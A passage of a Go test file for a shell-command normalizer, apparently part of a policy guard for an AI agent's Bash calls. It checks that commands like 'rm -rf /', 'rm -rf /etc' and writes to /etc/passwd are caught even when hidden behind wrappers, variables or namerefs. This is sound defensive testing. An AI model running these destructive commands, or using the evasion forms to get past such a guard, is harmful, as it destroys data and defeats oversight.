			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: marking every branch merge unknown discards an identical exact Git repository environment.
func TestNF19MergeRetainsIdenticalGitEnvironment(t *testing.T) {
	command := `if [ -e /runtime-choice ]; then GIT_DIR=/repo/safe; else GIT_DIR=/repo/safe; fi; git status`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if last.gitEnvironment["GIT_DIR"] != "/repo/safe" || last.gitEnvironmentUnknown || last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want identical concrete Git environment", command, last)
	}
	if verdict := evalBash(t, command); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow", command, verdict)
	}
}

// Mutation caught: merge uncertainty must not replace a stronger independent literal destructive candidate.
func TestNF19StateMergeUncertaintyPreservesLiteralDeny(t *testing.T) {
	command := `if [ -e /runtime-choice ]; then GIT_DIR=/repo/safe; else GIT_DIR=/etc; fi; git status; rm -rf /etc`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
	}
}

// Mutation caught: omitting PWD/HOME seeds leaves stable shell-owned paths unresolved in policy-bearing positions.
func TestNF19ResolvesSeededPWDAndHOME(t *testing.T) {
	repo := t.TempDir()
	home := filepath.Join(repo, "home")
	t.Setenv("HOME", home)
	command := `git add "$PWD/quoted" $PWD/plain "$HOME/quoted" $HOME/plain`
	got, err := Normalize(command, repo)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"git", "add", filepath.Join(repo, "quoted"), filepath.Join(repo, "plain"), filepath.Join(home, "quoted"), filepath.Join(home, "plain")}
	if len(got) != 1 || !reflect.DeepEqual(got[0].Argv, want) || got[0].Unresolved {
		t.Fatalf("Normalize(%q) = %+v, want seeded paths %q", command, got, want)
	}
	if verdict := checkBash(ToolCall{Tool: "Bash", Command: command, CWD: repo, RepoRoot: repo}, bashPol()); verdict != nil {
		t.Fatalf("seeded repository paths = %+v, want allow", verdict)
	}
}

// Mutation caught: restoring the old standalone-parameter rejection leaves exact PWD/HOME words unresolved and hides direct /etc targets.
func TestNF19ResolvesExactStandalonePWDHOMEAndAssignedPaths(t *testing.T) {
	repo := t.TempDir()
	home := filepath.Join(repo, "home")
	t.Setenv("HOME", home)
	got, err := Normalize(`git add $PWD $HOME`, repo)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"git", "add", repo, home}
	if len(got) != 1 || !reflect.DeepEqual(got[0].Argv, want) || got[0].Unresolved || !got[0].resolvedArgs[2] || !got[0].resolvedArgs[3] {
		t.Fatalf("standalone PWD/HOME = %+v, want concrete command %q", got, want)
	}

	for _, command := range []string{
		`TARGET=/etc; rm -rf $TARGET`,
		`PWD=/etc; rm -rf $PWD`,
		`HOME=/etc; rm -rf $HOME`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
			t.Errorf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
		}
	}
}

// Mutation caught: failing to update, override, or invalidate shell-owned variables can make destructive concrete paths evade policy.
func TestNF19PWDAndHOMEStateChangesRemainFailClosed(t *testing.T) {
	repo := t.TempDir()
	subdir := filepath.Join(repo, "sub")
	if err := os.Mkdir(subdir, 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", repo)

	got, err := Normalize(`cd sub; git add "$PWD/x"`, repo)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"git", "add", filepath.Join(subdir, "x")}
	if last := got[len(got)-1]; !reflect.DeepEqual(last.Argv, want) || last.Unresolved {
		t.Fatalf("successful cd last = %+v, want updated PWD command %q", last, want)
	}

	got, err = Normalize(`cd missing; git add "$PWD/x"`, repo)
	if err != nil {
		t.Fatal(err)
	}
	want = []string{"git", "add", filepath.Join(repo, "x")}
	if last := got[len(got)-1]; !reflect.DeepEqual(last.Argv, want) || last.Unresolved {
		t.Fatalf("failed cd last = %+v, want prior PWD command %q", last, want)
	}

	for _, command := range []string{
		`PWD=/etc; rm -rf "$PWD/x"`,
		`HOME=/etc; rm -rf $HOME/x`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
			t.Errorf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
		}
	}

	for _, command := range []string{
		`cd "$TARGET"; rm -rf "$PWD/x"`,
		`read HOME < /repo/input; rm -rf "$HOME/x"`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}

	verdict := checkBash(ToolCall{Tool: "Bash", Command: `rm -rf $PWD/x`, CWD: "/etc", RepoRoot: "/repo"}, bashPol())
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("cwd-seeded /etc PWD = %+v, want deny/P1.rm-rf", verdict)
	}
	t.Setenv("HOME", "/etc")
	verdict = evalBash(t, `rm -rf "$HOME/x"`)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("environment-seeded /etc HOME = %+v, want deny/P1.rm-rf", verdict)
	}
}

func TestNormalizePreservesPerWordProvenance(t *testing.T) {
	got, err := Normalize(`SDK=/repo/sdk; OUT=/repo/out; grep "$PATTERN" '$LITERAL' "$SDK/api" > "$OUT"`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 {
		t.Fatalf("Normalize returned %+v, want one command", got)
	}
	simple := got[0]
	if !simple.Unresolved || !simple.wordUnresolved(1) {
		t.Fatalf("Normalize = %+v, want argument 1 unresolved", simple)
	}
	if simple.wordUnresolved(2) || simple.wordUnresolved(3) {
		t.Fatalf("Normalize = %+v, want arguments 2 and 3 concrete", simple)
	}
	if !simple.resolvedArgs[3] || !simple.resolvedOut[0] {
		t.Fatalf("Normalize = %+v, want locally resolved argument and redirect provenance", simple)
	}
}

func TestNormalizePreservesRedirectProvenanceThroughReplacement(t *testing.T) {
	for _, command := range []string{
		`f() { printf ok; }; f "$PATTERN" > '$OUT'`,
		`watch printf "$PATTERN" > '$OUT'`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		found := false
		for _, simple := range got {
			if len(simple.Redirects) == 0 {
				continue
			}
			found = true
			if simple.Redirects[0] != "$OUT" || simple.outputRedirectUnresolved(0) {
				t.Errorf("Normalize(%q) redirect = %+v, want concrete literal $OUT", command, simple)
			}
		}
		if !found {
			t.Errorf("Normalize(%q) omitted redirect metadata: %+v", command, got)
		}
	}
}

func TestOperandRolesRetainAttachedOptionSourceArgument(t *testing.T) {
	parsed := parseOperandRolesWithSources([]string{"grep", "--file=$FILE", "/repo/input"})
	if len(parsed.operands) != 2 {
		t.Fatalf("parseOperandRolesWithSources returned %+v, want two operands", parsed.operands)
	}
	if got := parsed.operands[0]; got.value != "$FILE" || got.role != operandPath || got.sourceArg != 1 {
		t.Errorf("attached option operand = %+v, want path from argument 1", got)
	}
	if got := parsed.operands[1]; got.value != "/repo/input" || got.role != operandPath || got.sourceArg != 2 {
		t.Errorf("positional operand = %+v, want path from argument 2", got)
	}
}

func TestNormalizeOnlyResolvesEligiblePriorAssignments(t *testing.T) {
	for _, command := range []string{
		`TARGET=/repo/input cat "$TARGET"`,
		`if condition; then TARGET=/repo/a; else TARGET=/repo/b; fi; cat "$TARGET"`,
		`TARGET=(/repo/a /repo/b); cat "$TARGET"`,
		`TARGET=/repo/a; cat "${TARGET:-/repo/b}"`,
		`TARGET=$(pwd); cat "$TARGET"`,
		`TARGET=$((1 + 1)); cat "$TARGET"`,
		`cat "$INHERITED"`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		if len(got) == 0 || !got[len(got)-1].Unresolved {
			t.Errorf("Normalize(%q) = %+v, want unresolved final command", command, got)
		}
	}
}

func TestNormalizeInvalidatesVariablesMutatedByShellState(t *testing.T) {
	for _, command := range []string{
		`TARGET=/repo/safe; printf -v TARGET /etc; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; read TARGET < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; source /repo/script; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; declare TARGET=/etc; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; for TARGET in "$ITEM"; do :; done; rm -rf "$TARGET/guardrail-test"`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		if !last.wordUnresolved(2) {
			t.Errorf("Normalize(%q) last = %+v, want unresolved rm target", command, last)
		}
	}
}

func TestNormalizeRestoresCommandPrefixAssignmentsAfterFunctionCalls(t *testing.T) {
	command := `FIRST=/etc; SECOND=/var; inspect(){ rm -rf "$FIRST/body" "$SECOND/body"; }; FIRST=/repo/first SECOND=/repo/second inspect; rm -rf "$FIRST/caller" "$SECOND/caller"`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/repo/first/body", "/repo/second/body"}) {
		t.Fatalf("function body did not see command-prefix assignments: %+v", got)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/etc/caller", "/var/caller"}) {
		t.Fatalf("caller did not regain both prior assignments: %+v", got)
	}
}

func TestNormalizeInvalidatesAllShellFactsForMapfileCallbacks(t *testing.T) {
	command := `mutate(){ TARGET=/etc; cd /etc; }; TARGET=/repo/safe; KEEP=/repo/safe; mapfile -C mutate -c 1 ROWS <<<x; rm -rf "$TARGET/y" "$KEEP/y" relative`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if !last.wordUnresolved(2) || !last.wordUnresolved(3) || !last.cwdUnknown || last.Cwd != "" {
		t.Fatalf("mapfile callback retained current-shell facts: %+v", last)
	}
	initial := cwdState{
		cwd:       "/repo",
		cdpath:    "/repo/safe",
		cdpathSet: true,
		variables: map[string]string{"TARGET": "/repo/safe"},
	}
	result, err := normalizeWithState(`mapfile -C mutate -c 1 ROWS <<<x`, initial, &normalizeContext{}, nil, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	state := result.outcome.merged()
	if !state.unknown || !state.fsUncertain || !state.cdpathUnknown || state.cdpathSet || len(state.variables) != 0 || !state.gitEnvironmentUnknown {
		t.Fatalf("mapfile callback outcome retained shell facts: %+v", state)
	}

	for _, command := range []string{
		`TARGET=/repo/safe; mapfile ROWS <<<x; rm -rf "$TARGET/y"`,
		`TARGET=/repo/safe; readarray -t ROWS <<<x; rm -rf "$TARGET/y"`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		if last.wordUnresolved(2) || last.cwdUnknown || last.Cwd != "/repo" || last.Argv[2] != "/repo/safe/y" {
			t.Errorf("non-callback mapfile/readarray lost unrelated facts: %+v", last)
		}
	}
}

func TestNormalizeInvalidatesGetoptsOutputsOnly(t *testing.T) {
	for _, command := range []string{
		`opt=/repo/safe; getopts a: opt -a /etc; rm -rf "$opt/y"`,
		`OPTARG=/repo/safe; getopts a: opt -a /etc; rm -rf "$OPTARG/y"`,
		`OPTIND=/repo/safe; getopts a: opt -a /etc; rm -rf "$OPTIND/y"`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		if last := got[len(got)-1]; !last.wordUnresolved(2) {
			t.Errorf("Normalize(%q) retained stale getopts output: %+v", command, last)
		}
	}

	got, err := Normalize(`TARGET=/repo/safe; getopts a: opt -a /etc; rm -rf "$TARGET/y"`, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if last.wordUnresolved(2) || last.Argv[2] != "/repo/safe/y" {
		t.Fatalf("getopts invalidated an unrelated variable: %+v", last)
	}
}

func TestNormalizeScopesGitEnvironmentUncertaintyToMutatedVariables(t *testing.T) {
	for _, command := range []string{
		`printf -v TARGET /etc; git config user.email x@y.com`,
		`read TARGET < /repo/input; git config user.email x@y.com`,
		`declare TARGET=/etc; git config user.email x@y.com`,
		`mapfile -d , TARGET < /repo/input; git config user.email x@y.com`,
		`mapfile -td, TARGET < /repo/input; git config user.email x@y.com`,
		`mapfile -u 3 TARGET < /repo/input; git config user.email x@y.com`,
		`mapfile -tu3 TARGET < /repo/input; git config user.email x@y.com`,
		`readarray -d , TARGET < /repo/input; git config user.email x@y.com`,
		`readarray -td, TARGET < /repo/input; git config user.email x@y.com`,
		`readarray -u 3 TARGET < /repo/input; git config user.email x@y.com`,
		`readarray -tu3 TARGET < /repo/input; git config user.email x@y.com`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		if last.Unresolved || last.gitEnvironmentUnknown {
			t.Errorf("Normalize(%q) last = %+v, want concrete Git environment", command, last)
		}
	}

	for _, command := range []string{
		`printf -v GIT_DIR /tmp/foreign/.git; git config user.email x@y.com`,
		`read GIT_WORK_TREE < /repo/input; git config user.email x@y.com`,
		`declare GIT_COMMON_DIR=/tmp/foreign/.git; git config user.email x@y.com`,
		`printf -v "$NAME" /tmp/foreign/.git; git config user.email x@y.com`,
		`source /repo/script; git config user.email x@y.com`,
		`mapfile -d , GIT_DIR < /repo/input; git config user.email x@y.com`,
		`mapfile -tu3 GIT_COMMON_DIR < /repo/input; git config user.email x@y.com`,
		`readarray -td, GIT_WORK_TREE < /repo/input; git config user.email x@y.com`,
		`readarray -u 3 GIT_DIR < /repo/input; git config user.email x@y.com`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		if !last.Unresolved || !last.gitEnvironmentUnknown {
			t.Errorf("Normalize(%q) last = %+v, want unresolved Git environment", command, last)
		}
	}
}

func TestNormalizeInvalidatesImplicitAndNamerefMutationTargets(t *testing.T) {
	for _, command := range []string{
		`REPLY=/repo/safe; read < /repo/input; rm -rf "$REPLY/guardrail-test"`,
		`REPLY=/repo/safe; read -rp prompt < /repo/input; rm -rf "$REPLY/guardrail-test"`,
		`MAPFILE=/repo/safe; mapfile < /repo/input; rm -rf "$MAPFILE/guardrail-test"`,
		`MAPFILE=/repo/safe; mapfile -C callback < /repo/input; rm -rf "$MAPFILE/guardrail-test"`,
		`MAPFILE=/repo/safe; readarray < /repo/input; rm -rf "$MAPFILE/guardrail-test"`,
		`MAPFILE=/repo/safe; mapfile -d , < /repo/input; rm -rf "$MAPFILE/guardrail-test"`,
		`MAPFILE=/repo/safe; mapfile -tu3 < /repo/input; rm -rf "$MAPFILE/guardrail-test"`,
		`MAPFILE=/repo/safe; readarray -td, < /repo/input; rm -rf "$MAPFILE/guardrail-test"`,
		`MAPFILE=/repo/safe; readarray -u 3 < /repo/input; rm -rf "$MAPFILE/guardrail-test"`,
		`TARGET=/repo/safe; mapfile -d < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; readarray -x TARGET < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; read -a TARGET < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; mapfile -t TARGET < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; readarray TARGET < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; declare -n REF=TARGET; printf -v REF /etc; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; typeset -n REF=TARGET; read REF < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; declare -gn REF=TARGET; read REF < /repo/input; rm -rf "$TARGET/guardrail-test"`,
		`TARGET=/repo/safe; declare -n REF=TARGET; REF=/etc; rm -rf "$TARGET/guardrail-test"`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", command, err)
		}
		last := got[len(got)-1]
		if !last.wordUnresolved(2) {
			t.Errorf("Normalize(%q) last = %+v, want unresolved mutation target", command, last)
		}
	}
}

func TestSplitSimplesRedirect(t *testing.T) {
	got, err := splitSimples(`echo hi > out.txt`)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || len(got[0].Redirects) != 1 || got[0].Redirects[0] != "out.txt" {
		t.Fatalf("redirects = %+v, want [out.txt]", got)
	}
}

func TestNormalizeRedirectOnlyStatements(t *testing.T) {
	cases := map[string][]string{
		`> /etc/passwd`:        {"/etc/passwd"},
		`>/etc/passwd`:         {"/etc/passwd"},
		`>> /etc/passwd`:       {"/etc/passwd"},
		`2> /etc/error.log`:    {"/etc/error.log"},
		`&> /etc/combined.log`: {"/etc/combined.log"},
		`exec 3> /etc/passwd`:  {"/etc/passwd"},
		`exec 3>> /etc/passwd`: {"/etc/passwd"},
	}
	for src, wantRedirects := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		want := []Simple{{Redirects: wantRedirects}}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", src, got, want)
		}
	}
}

func TestNormalizeCommandLookupRetainsRedirects(t *testing.T) {
	for _, c := range []struct {
		src       string
		wantReads []string
	}{
		{`command -v git > /repo/CLAUDE.md`, nil},
		{`command -V git > /repo/CLAUDE.md`, nil},
		{`command > /repo/CLAUDE.md`, nil},
		{`command -v git < /repo/.env > /repo/CLAUDE.md`, []string{"/repo/.env"}},
	} {
		got, err := Normalize(c.src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", c.src, err)
			continue
		}
		want := []Simple{{Redirects: []string{"/repo/CLAUDE.md"}, ReadRedirects: c.wantReads}}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", c.src, got, want)
		}
	}
}

func TestNormalizeClassifiesWriteRedirectsDirectionally(t *testing.T) {
	cases := []struct {
		src        string
		wantCount  int
		wantWrites []string
		wantReads  []string
	}{
		{`> out`, 1, []string{"out"}, nil},
		{`>> append`, 1, []string{"append"}, nil},
		{`>| clobber`, 1, []string{"clobber"}, nil},
		{`&> all`, 1, []string{"all"}, nil},
		{`&>> append-all`, 1, []string{"append-all"}, nil},
		{`<> read-write`, 1, []string{"read-write"}, []string{"read-write"}},
		{`< input`, 1, nil, []string{"input"}},
		{`3< input`, 1, nil, []string{"input"}},
		{`2>&1`, 0, nil, nil},
		{`2>&-`, 0, nil, nil},
		{`>&2`, 0, nil, nil},
		{`>&-`, 0, nil, nil},
		{`0<&1`, 0, nil, nil},
		{`<&-`, 0, nil, nil},
		{`>& output`, 1, []string{"output"}, nil},
		{"cat <<'/etc/passwd'\nbody\n/etc/passwd", 1, nil, nil},
		{"cat <<-'/etc/passwd'\nbody\n/etc/passwd", 1, nil, nil},
		{`cat <<< /etc/passwd`, 1, nil, nil},
	}
	for _, c := range cases {
		got, err := Normalize(c.src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", c.src, err)
			continue
		}
		if len(got) != c.wantCount {
			t.Errorf("Normalize(%q) count = %d, want %d: %+v", c.src, len(got), c.wantCount, got)
			continue
		}
		if len(got) == 1 && !reflect.DeepEqual(got[0].Redirects, c.wantWrites) {
			t.Errorf("Normalize(%q) writes = %v, want %v", c.src, got[0].Redirects, c.wantWrites)
		}
		if len(got) == 1 && !reflect.DeepEqual(got[0].ReadRedirects, c.wantReads) {
			t.Errorf("Normalize(%q) reads = %v, want %v", c.src, got[0].ReadRedirects, c.wantReads)
		}
	}
}

func TestNormalizePreservesRedirectOrderWithinEachDirection(t *testing.T) {
	got, err := Normalize(`cat > first < input >> second <> both`, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 {
		t.Fatalf("Normalize returned %+v, want one Simple", got)
	}
	wantWrites := []string{"first", "second", "both"}
	if !reflect.DeepEqual(got[0].Redirects, wantWrites) {
		t.Errorf("writes = %v, want %v", got[0].Redirects, wantWrites)
	}
	wantReads := []string{"input", "both"}
	if !reflect.DeepEqual(got[0].ReadRedirects, wantReads) {
		t.Errorf("reads = %v, want %v", got[0].ReadRedirects, wantReads)
	}
}

func TestNormalizePreservesRedirectDirectionsThroughWrapper(t *testing.T) {
	got, err := Normalize(`env cat < input > output`, "")
	if err != nil {
		t.Fatal(err)
	}
	want := []Simple{{
		Argv:          []string{"cat"},
		Redirects:     []string{"output"},
		ReadRedirects: []string{"input"},
	}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Normalize = %+v, want %+v", got, want)
	}
}

func TestNormalizeCompoundStatementRedirects(t *testing.T) {
	cases := []struct {
		src  string
		want []Simple
	}{
		{
			`{ :; } > /repo/CLAUDE.md`,
			[]Simple{{Redirects: []string{"/repo/CLAUDE.md"}}, {Argv: []string{":"}}},
		},
		{
			`( :) < /repo/input`,
			[]Simple{{ReadRedirects: []string{"/repo/input"}}, {Argv: []string{":"}}},
		},
		{
			`if true; then :; fi <> /repo/state`,
			[]Simple{
				{Redirects: []string{"/repo/state"}, ReadRedirects: []string{"/repo/state"}},
				{Argv: []string{"true"}},
				{Argv: []string{":"}},
			},
		},
		{
			`{ :; } > "$TARGET"`,
			[]Simple{{Redirects: []string{`"$TARGET"`}, Unresolved: true}, {Argv: []string{":"}}},
		},
		{
			`{ : > /repo/inner; } > /repo/outer`,
			[]Simple{
				{Redirects: []string{"/repo/outer"}},
				{Argv: []string{":"}, Redirects: []string{"/repo/inner"}},
			},
		},
	}
	for _, c := range cases {
		got, err := Normalize(c.src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", c.src, err)
			continue
		}
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", c.src, got, c.want)
		}
	}
}

func TestSplitSimplesParseError(t *testing.T) {
	if _, err := splitSimples(`echo "unterminated`); err == nil {
		t.Fatal("want parse error for unterminated string")
	}
}

func TestNormalizeStripsWrappers(t *testing.T) {
	cases := []struct {
		src  string
		want [][]string
	}{
		{`timeout 5 rm -rf /`, [][]string{{"rm", "-rf", "/"}}},
		{`time git status`, [][]string{{"git", "status"}}},
		{`nice -n 10 make`, [][]string{{"make"}}},
		{`nohup ./server &`, [][]string{{"./server"}}},
		{`env FOO=1 BAR=2 curl example.com`, [][]string{{"curl", "example.com"}}},
	}
	for _, c := range cases {
		got, err := Normalize(c.src, "")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", c.src, err)
		}
		if !reflect.DeepEqual(argvs(got), c.want) {
			t.Errorf("Normalize(%q) = %v, want %v", c.src, argvs(got), c.want)
		}
	}
}

func TestNormalizePreservesUnresolved(t *testing.T) {
	got, err := Normalize(`env FOO=1 rm -rf $TARGET`, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || !got[0].Unresolved {
		t.Fatalf("want Unresolved=true after normalization, got %+v", got)
	}
}

func TestNormalizeConsumesWrapperFlags(t *testing.T) {
	cases := []struct {
		src  string
		want [][]string
	}{
		{`env -i rm -rf /`, [][]string{{"rm", "-rf", "/"}}},
		{`env -u HOME rm -rf /`, [][]string{{"rm", "-rf", "/"}}},
		{`timeout -k 5 10 rm -rf /`, [][]string{{"rm", "-rf", "/"}}},
		{`nice -10 make`, [][]string{{"make"}}},
		{`exec rm -rf /`, [][]string{{"rm", "-rf", "/"}}},
		{`exec -a name rm -rf /`, [][]string{{"rm", "-rf", "/"}}},
		{`xargs -0 -n 1 rm`, [][]string{{"rm"}}},
		{`command git status`, [][]string{{"git", "status"}}},
	}
	for _, c := range cases {
		got, err := Normalize(c.src, "")
		if err != nil {
			t.Fatalf("Normalize(%q): %v", c.src, err)
		}
		if !reflect.DeepEqual(argvs(got), c.want) {
			t.Errorf("Normalize(%q) = %v, want %v", c.src, argvs(got), c.want)
		}
	}
}

func TestNormalizeConsumesAddedWrapperOptions(t *testing.T) {
	cases := []string{
		`setsid -f --fork -w --wait -c --ctty rm -rf /`,
		`setsid -fw rm -rf /`,
		`stdbuf -iL -o 0 -eL rm -rf /`,
		`stdbuf -o0 rm -rf /`,
		`stdbuf --input=L --output 0 --error=L rm -rf /`,
		`ionice -c2 -n 7 -t rm -rf /`,
		`ionice -tc2 rm -rf /`,
		`ionice --class 2 --classdata=7 --ignore rm -rf /`,
		`watch -n2 -d -t -b -e rm -rf /`,
		`watch -dtn2 rm -rf /`,
		`watch --interval 2 --differences --no-title rm -rf /`,
		`watch --differences=permanent rm -rf /`,
	}
	for _, src := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		want := [][]string{{"rm", "-rf", "/"}}
		if !reflect.DeepEqual(argvs(got), want) {
			t.Errorf("Normalize(%q) = %v, want %v", src, argvs(got), want)
		}
	}
}

func TestNormalizeAddedWrappersHonorOptionTerminator(t *testing.T) {
	cases := []string{
		`setsid -- rm -rf /`,
		`stdbuf -- rm -rf /`,
		`ionice -- rm -rf /`,
		`watch -- rm -rf /`,
	}
	for _, src := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		want := [][]string{{"rm", "-rf", "/"}}
		if !reflect.DeepEqual(argvs(got), want) {
			t.Errorf("Normalize(%q) = %v, want %v", src, argvs(got), want)
		}
	}

	got, err := Normalize(`chroot -- /new-root rm -rf /`, "")
	if err != nil {
		t.Fatal(err)
	}
	want := []Simple{{Argv: []string{"rm", "-rf", "/"}, Unresolved: true}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Normalize chroot -- = %+v, want %+v", got, want)
	}
}

func TestNormalizeAddedWrapperErrorsFailClosed(t *testing.T) {
	cases := []string{
		`setsid --future-option rm -rf /`,
		`stdbuf --future-option rm -rf /`,
		`ionice --future-option rm -rf /`,
		`watch --future-option rm -rf /`,
		`chroot --future-option /new-root rm -rf /`,
		`stdbuf --output`,
		`ionice --class`,
		`ionice -tc`,
		`watch --interval`,
		`watch -dtn`,
		`watch`,
		`chroot --userspec`,
		`chroot`,
		`chroot /new-root`,
		`setsid -fz rm -rf /`,
		`ionice -tz rm -rf /`,
		`watch -dtz rm -rf /`,
		`watch --no-title=value rm -rf /`,
	}
	for _, src := range cases {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		if len(got) != 1 || !got[0].Unresolved {
			t.Errorf("Normalize(%q) = %+v, want one unresolved Simple", src, got)
		}
	}
}

func TestNormalizeAddedWrappersPreserveRedirectDirections(t *testing.T) {
	for _, prefix := range []string{
		`setsid`,
		`stdbuf -o0`,
		`ionice -c2`,
	} {
		src := prefix + ` cat < input > output`
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		want := []Simple{{
			Argv:          []string{"cat"},
			Redirects:     []string{"output"},
			ReadRedirects: []string{"input"},
		}}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", src, got, want)
		}
	}
}

func TestNormalizeWatchTreatsCommandAsShellSource(t *testing.T) {
	cases := []struct {
		src  string
		want []Simple
	}{
		{
			`watch 'rm -rf /'`,
			[]Simple{{Argv: []string{"rm", "-rf", "/"}, gitEnvironmentUnknown: true}},
		},
		{
			`watch 'printf ok; rm -rf /'`,
			[]Simple{{Argv: []string{"printf", "ok"}, gitEnvironmentUnknown: true}, {Argv: []string{"rm", "-rf", "/"}, gitEnvironmentUnknown: true}},
		},
		{
			`watch 'printf ok > /etc/passwd'`,
			[]Simple{{Argv: []string{"printf", "ok"}, Redirects: []string{"/etc/passwd"}, gitEnvironmentUnknown: true}},
		},
		{
			`watch 'printf ok; cat < inner-input' < outer-input > outer-output`,
			[]Simple{
				{Redirects: []string{"outer-output"}, ReadRedirects: []string{"outer-input"}},
				{Argv: []string{"printf", "ok"}, gitEnvironmentUnknown: true},
				{Argv: []string{"cat"}, ReadRedirects: []string{"inner-input"}, gitEnvironmentUnknown: true},
			},
		},
		{
			`watch 'printf ok' > "$TARGET"`,
			[]Simple{
				{Redirects: []string{`"$TARGET"`}, Unresolved: true},
				{Argv: []string{"printf", "ok"}, Unresolved: true, gitEnvironmentUnknown: true},
			},
		},
	}
	for _, c := range cases {
		got, err := Normalize(c.src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", c.src, err)
			continue
		}
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", c.src, got, c.want)
		}
	}
}

func TestNormalizeChrootDerivationsAreUnresolved(t *testing.T) {
	for _, src := range []string{
		`chroot --userspec=root --groups wheel /new-root rm -rf /repo`,
		`chroot --userspec root --groups=wheel /new-root rm -rf /repo`,
	} {
		got, err := Normalize(src, "")
		if err != nil {
			t.Errorf("Normalize(%q): %v", src, err)
			continue
		}
		want := []Simple{{Argv: []string{"rm", "-rf", "/repo"}, Unresolved: true}}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("Normalize(%q) = %+v, want %+v", src, got, want)
		}
	}

	got, err := Normalize(`chroot /new-root cat < input > output`, "")
	if err != nil {
		t.Fatal(err)
	}
	want := []Simple{{
		Argv:          []string{"cat"},
		Redirects:     []string{"output"},
